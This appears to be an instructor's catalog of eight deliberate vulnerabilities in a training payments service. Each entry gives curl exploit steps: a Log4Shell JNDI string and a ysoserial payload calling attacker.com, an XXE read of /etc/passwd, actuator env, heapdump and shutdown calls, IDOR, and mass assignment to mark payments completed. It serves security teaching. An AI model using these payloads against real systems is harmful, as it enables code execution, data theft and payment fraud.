# ShopWorthy Payments — Vulnerability Catalog

> **Instructor-facing document.** Documents every intentional vulnerability in the `payments` repository.

---

## VULN-PAY-001 — Log4Shell (CVE-2021-44228)

| Field | Detail |
|-------|--------|
| **ID** | VULN-PAY-001 |
| **Type** | Supply Chain / Remote Code Execution |
| **OWASP** | A06:2021 – Vulnerable and Outdated Components |
| **Severity** | Critical |
| **File** | `pom.xml` (Log4j 2.14.1), `src/main/java/.../controller/PaymentController.java` ~line 36 |

### Description
Log4j is pinned to version 2.14.1 (CVE-2021-44228). The `User-Agent` header is logged at INFO level on every payment request. A JNDI injection string in the User-Agent triggers an outbound LDAP lookup, enabling RCE.

### Exploitation Steps
1. Start a JNDI exploit server (e.g., `marshalsec` or `JNDI-Exploit-Kit`)
2. Send a payment request with a malicious User-Agent:

```bash
curl -X POST http://localhost:6000/payments/charge \
  -H "Content-Type: application/json" \
  -H 'User-Agent: ${jndi:ldap://attacker.com:1389/exploit}' \
  -d '{"orderId":1,"userId":1,"amount":99.99}'
```

---

## VULN-PAY-002 — XXE (XML External Entity Injection)

| Field | Detail |
|-------|--------|
| **ID** | VULN-PAY-002 |
| **Type** | Injection |
| **OWASP** | A03:2021 – Injection |
| **Severity** | Critical |
| **File** | `src/main/java/.../controller/PaymentController.java` ~line 55 |

### Description
The `/payments/xml-charge` endpoint parses XML using `DocumentBuilderFactory` without disabling external entity processing. An attacker can read arbitrary files from the host filesystem.

### Exploitation Steps
```bash
curl -X POST http://localhost:6000/payments/xml-charge \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><payment><orderId>&xxe;</orderId><amount>1.00</amount><userId>1</userId></payment>'
```

---

## VULN-PAY-003 — IDOR on Transaction Lookup

| Field | Detail |
|-------|--------|
| **ID** | VULN-PAY-003 |
| **Type** | BOLA / IDOR |
| **OWASP** | A01:2021 – Broken Access Control |
| **Severity** | High |
| **File** | `src/main/java/.../controller/TransactionController.java` ~line 21 |

### Description
`GET /payments/transactions/{orderId}` returns all transactions for any order ID with no authentication or ownership check.

### Exploitation Steps
```bash
curl http://localhost:6000/payments/transactions/1
curl http://localhost:6000/payments/transactions/2
# Returns transaction details for any order
```

---

## VULN-PAY-004 — Hardcoded Gateway Credentials

| Field | Detail |
|-------|--------|
| **ID** | VULN-PAY-004 |
| **Type** | Sensitive Data Exposure |
| **OWASP** | A02:2021 – Cryptographic Failures |
| **Severity** | High |
| **File** | `src/main/resources/application.properties` lines 12-13 |

### Description
Payment gateway API key and secret are hardcoded in `application.properties` and committed to the repository.

### Values
```
gateway.api.key=sk_live_shopworthy_gateway_abc123xyz
gateway.api.secret=gateway-secret-do-not-share
```

---

## VULN-PAY-005 — Spring Boot Actuator Fully Exposed

| Field | Detail |
|-------|--------|
| **ID** | VULN-PAY-005 |
| **Type** | Security Misconfiguration |
| **OWASP** | A05:2021 – Security Misconfiguration |
| **Severity** | High |
| **File** | `src/main/resources/application.properties` lines 21-26 |

### Description
All Actuator endpoints are exposed with no authentication, including `env` (leaks all environment variables), `heapdump` (full JVM heap), and `shutdown` (kills the service).

### Exploitation Steps
```bash
# Leak all environment variables including gateway credentials
curl http://localhost:6000/actuator/env

# Download heap dump (extract credentials from memory)
curl http://localhost:6000/actuator/heapdump -o heap.hprof

# Shut down the service
curl -X POST http://localhost:6000/actuator/shutdown
```

---

## VULN-PAY-006 — Java Deserialization

| Field | Detail |
|-------|--------|
| **ID** | VULN-PAY-006 |
| **Type** | Insecure Deserialization |
| **OWASP** | A08:2021 – Software and Data Integrity Failures |
| **Severity** | Critical |
| **File** | `src/main/java/.../controller/WebhookController.java` ~line 45 |

### Description
The `/payments/webhook/legacy` endpoint reads arbitrary Java-serialized objects from the request body using `ObjectInputStream.readObject()`. Gadget chains (e.g., from `ysoserial`) can achieve RCE.

### Exploitation Steps
```bash
# Generate a payload with ysoserial
java -jar ysoserial.jar CommonsCollections6 "curl http://attacker.com/pwned" > payload.ser

# Send to vulnerable endpoint
curl -X POST http://localhost:6000/payments/webhook/legacy \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.ser
```

---

## VULN-PAY-007 — Mass Assignment via JPA Entity Binding

| Field | Detail |
|-------|--------|
| **ID** | VULN-PAY-007 |
| **Type** | Mass Assignment |
| **OWASP** | A03:2021 – Injection |
| **Severity** | High |
| **File** | `src/main/java/.../controller/PaymentController.java` ~line 32 |

### Description
The `/payments/charge` endpoint binds the entire request body directly to the `Payment` JPA entity. A client can set `status`, `gatewayTransactionId`, or any other field directly.

### Exploitation Steps
```bash
# Set payment status to completed/refunded without going through gateway
curl -X POST http://localhost:6000/payments/charge \
  -H "Content-Type: application/json" \
  -d '{"orderId":1,"userId":1,"amount":0.01,"status":"completed","gatewayTransactionId":"FAKE-TXN"}'
```

---

## VULN-PAY-008 — Verbose Exception Handler (Stack Trace Disclosure)

| Field | Detail |
|-------|--------|
| **ID** | VULN-PAY-008 |
| **Type** | Security Misconfiguration |
| **OWASP** | A05:2021 – Security Misconfiguration |
| **Severity** | Low |
| **File** | `src/main/java/.../config/GlobalExceptionHandler.java` ~line 18 |

### Description
The global exception handler returns the full Java stack trace in the JSON response body, leaking class names, package structure, Spring version, and library details.

### Exploitation Steps
```bash
# Trigger an exception with an invalid request
curl -X POST http://localhost:6000/payments/charge \
  -H "Content-Type: application/json" \
  -d '{"orderId":"not-a-number"}'
# Response includes full stack trace
```
